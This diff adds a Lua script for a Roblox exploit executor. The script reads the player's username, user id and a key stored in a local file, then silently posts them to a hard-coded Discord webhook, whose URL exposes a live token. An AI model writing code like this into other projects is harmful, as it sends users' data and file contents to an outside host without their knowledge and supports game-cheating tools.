@@ -1,0 +1,32 @@
+local Player = game:GetService("Players").LocalPlayer
+local TimeExecuted = os.date("**Executed** on: %x %X%p %Z")
+local executor = identifyexecutor()
+local Country = game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(Player)
+
+local url = "https://discord.com/api/webhooks/1309764426026717235/ZuqXJVQ04gIlVtUjthV5MHW3tOcxnUuZdUBj8Lcn_wzjH75OkEDz01TsqbZIcXFEDi2x"
+local data = {
+	["embeds"] = {
+		{
+			["color"] = 16711680,
+			["fields"] = {
+				{
+					["name"] = "Key Created!",
+					["value"] = "**Username**: "..Player.Name.."\n**Key**:"..readfile(".vxhbksys")
+				},
+			},
+			["thumbnail"] = {
+				["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=420&height=420&format=png"
+			}
+		}
+	}
+}
+
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+	["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
